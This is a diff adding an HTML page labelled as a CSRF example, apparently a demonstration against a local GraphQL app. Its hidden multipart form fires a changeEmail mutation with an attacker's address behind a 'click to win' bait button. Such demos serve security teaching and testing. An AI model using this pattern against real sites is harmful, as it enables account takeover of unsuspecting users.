@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF EXAMPLE</title>
+  </head>
+  <body>
+    <form
+      method="post"
+      enctype="multipart/form-data"
+      action="http://localhost:3000/graphql"
+    >
+      <input
+        type="text"
+        name="operations"
+        value='{"query": "mutation($email: String!) { changeEmail(newEmail: $email) }"}'
+        hidden
+      />
+
+      <input
+        type="text"
+        name="map"
+        value='{ "0":  ["variables.email"] }'
+        hidden
+      />
+
+      <input type="text" name="0" value="malicious_email@email.com" hidden />
+
+      <input type="submit" value="click to win" />
+    </form>
+  </body>
+</html>
